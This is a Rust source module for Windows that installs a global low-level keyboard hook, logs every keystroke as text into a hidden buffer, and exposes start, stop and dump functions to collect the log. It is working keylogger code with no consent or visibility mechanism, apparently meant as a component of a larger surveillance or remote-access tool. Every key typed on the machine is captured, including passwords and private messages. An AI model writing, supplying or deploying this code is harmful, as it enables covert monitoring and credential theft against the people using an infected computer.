use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::Foundation::*;
use std::ptr;

static mut LOG_BUFFER: Option<Arc<Mutex<String>>> = None;
static mut HOOK_HANDLE: Option<HHOOK> = None;

pub fn start() {
    unsafe {
        LOG_BUFFER = Some(Arc::new(Mutex::new(String::new())));
        
        // Set keyboard hook
        HOOK_HANDLE = Some(SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(keyboard_hook),
            GetModuleHandleW(ptr::null()),
            0
        ).unwrap());
    }
}

pub fn stop() {
    unsafe {
        if let Some(hook) = HOOK_HANDLE {
            UnhookWindowsHookEx(hook);
            HOOK_HANDLE = None;
        }
    }
}

pub fn dump() -> String {
    unsafe {
        if let Some(buffer) = &LOG_BUFFER {
            let mut guard = buffer.lock().unwrap();
            let result = guard.clone();
            guard.clear();
            return result;
        }
    }
    String::new()
}

unsafe extern "system" fn keyboard_hook(
    code: i32,
    wparam: WPARAM,
    lparam: LPARAM
) -> LRESULT {
    if code >= 0 && wparam.0 as u32 == WM_KEYDOWN {
        let kb = *(lparam.0 as *const KBDLLHOOKSTRUCT);
        
        let key = match kb.vkCode as u16 {
            0x08 => "[BACKSPACE]".to_string(),
            0x09 => "[TAB]".to_string(),
            0x0D => "[ENTER]\n".to_string(),
            0x10 | 0xA0 | 0xA1 => "[SHIFT]".to_string(),
            0x11 | 0xA2 | 0xA3 => "[CTRL]".to_string(),
            0x12 | 0xA4 | 0xA5 => "[ALT]".to_string(),
            0x1B => "[ESC]".to_string(),
            0x20 => " ".to_string(),
            0x2E => "[DEL]".to_string(),
            vk => {
                // Convert to ASCII
                let mut key_state = [0u8; 256];
                GetKeyboardState(&mut key_state);
                
                let mut buf = [0u16; 4];
                let len = ToUnicode(
                    vk as u32,
                    kb.scanCode as u32,
                    &key_state,
                    &mut buf,
                    4,
                    0
                );
                
                if len > 0 {
                    String::from_utf16_lossy(&buf[..len as usize])
                } else {
                    format!("[{}]", vk)
                }
            }
        };
        
        if let Some(buffer) = &LOG_BUFFER {
            if let Ok(mut guard) = buffer.lock() {
                guard.push_str(&key);
            }
        }
    }
    
    CallNextHookEx(HHOOK::default(), code, wparam, lparam)
}